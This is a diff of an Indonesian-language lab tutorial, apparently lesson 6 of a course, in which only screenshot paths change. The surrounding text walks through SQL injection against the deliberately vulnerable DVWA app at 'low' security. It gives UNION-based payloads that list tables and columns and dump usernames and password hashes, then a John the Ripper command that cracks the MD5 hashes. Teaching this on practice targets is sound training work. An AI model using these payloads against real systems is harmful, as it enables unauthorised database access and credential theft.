@@ -26,7 +26,7 @@
      3. Login: admin
      4. Password: password
      5. Klik Login
-   * ![](/assets/0. Login.PNG)
+   * ![](/assets/lesson6/1.PNG)
 
 | **Section 2: Tetapkan Tingkat Keamanan** |
 | :--- |
@@ -39,7 +39,7 @@
      2. Pilih "low"  
      3. Klik Submit
 
-   * ![](/assets/0. Security.PNG)
+   * ![](/assets/lesson6/2.PNG)
 
 | **Section 3: Lakukan SQL Injection** |
 | :--- |
@@ -49,7 +49,7 @@
 
    * **Langkah:**
      1. Pilih "SQL Injection" dari menu bagian kiri.
-   * ![](/assets/0.2. sql injection .PNG)![](/assets/0.1. sql injection .PNG)
+   * ![](/assets/lesson6/3.PNG)
 
 2. Injection dasar
 
@@ -57,7 +57,7 @@
      1. Masukkan "1" ke dalam text box.
      2. Klik Submit.
      3. Akan terlihat informasi user dengan id 1.
-   * ![](/assets/1. Manual injection.PNG)
+   * ![](/assets/lesson6/4.PNG)
 
 3. Always True Scenario
 
@@ -65,7 +65,7 @@
      1. Masukkan text di bawah ke User ID Textbox.
         * `%' or '0'='0`
      2. Klik Submit
-   * ![](/assets/1.1 Always true condition.PNG)
+   * ![](/assets/lesson6/5.PNG)
 
 4. Menampilkan versi database
 
@@ -73,7 +73,7 @@
      1. Masukkan text di bawah ke dalam User ID Textbox.
         * `%' or 0=0 union select null, version() #`
      2. Klik Submit
-   * ![](/assets/1.2 database version.PNG)
+   * ![](/assets/lesson6/6.PNG)
 
 5. Menampilkan user dari database
 
@@ -82,14 +82,14 @@
 
      * `%' or 0=0 union select null, user() #`
 
-   * ![](/assets/1.3 Display Database User.PNG)
+   * ![](/assets/lesson6/7.PNG)
 
 6. Menampilkan nama dari database
 
    * **Langkah:**
      1. Masukkan text di bawah ke dalam User ID Textbox.
         * `%' or 0=0 union select null, database() #`
-   * ![](/assets/1.4 display database name.PNG)
+   * ![](/assets/lesson6/8.PNG)
 
 7. Menampilkan semua tabel dalam information\_schema
 
@@ -97,7 +97,7 @@
      1. Masukkan text di bawah ke dalam User ID Textbox.
         * `%' and 1=0 union select null, table_name from information_schema.tables #`
      2. Klik Submit
-   * ![](/assets/1.5 Display all the user tables in information_schema.PNG)
+   * ![](/assets/lesson6/9.PNG)
 
 8. Menampilkan semua tabel user di dalam information\_schema
 
@@ -105,7 +105,7 @@
      1. Masukkan text di bawah ke dalam User ID Textbox.
         * `%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#`
      2. Klik Submit
-   * ![](/assets/1.7 Display all the columns fields in the information_schema user table.PNG)
+   * ![](/assets/lesson6/10.PNG)
 
 9. Menampilkan semua field kolom dalam tabel user di information\_schema
 
@@ -113,7 +113,7 @@
      1. Masukkan text di bawah ke dalam User ID Textbox.
         * `%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #`
      2. Klik Submit
-   * ![](/assets/1.7 Display all the columns fields in the information_schema user table.PNG)
+   * ![](/assets/lesson6/11.PNG)
 
 10. Menampilkan semua kolom field pada tabel user di kolom information\_schema.
 
@@ -121,7 +121,7 @@
       1. Masukkan text di bawah ke dalam ID Textbox.
          * `%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`
       2. Klik Submit
-    * ![](/assets/1.8 Display all the columns field contents in the information_schema user table.PNG)
+    * ![](/assets/lesson6/11.PNG)
 
 | **Section 4: Membuat file hash password** |
 | :--- |
@@ -137,7 +137,7 @@
 
      3. Copy
 
-   * ![](/assets/2.1 Create Password Hash File.PNG)
+   * ![](/assets/lesson6/12.PNG)
 
 2. Simpan dalam file
 
@@ -149,7 +149,7 @@
 
      2. Simpan file
 
-   * ![](/assets/2.2 save password in text.PNG)
+   * ![](/assets/lesson6/13.PNG)
 
 | **Section 5: Menggunakan John the Ripper** |
 | :--- |
@@ -165,7 +165,7 @@
         ```
         john -show -format=raw-MD5 dvwa_password.txt
         ```
-   * ![](/assets/3. Hasil Akhir.PNG)
+   * ![](/assets/lesson6/14.PNG)
 
 
 
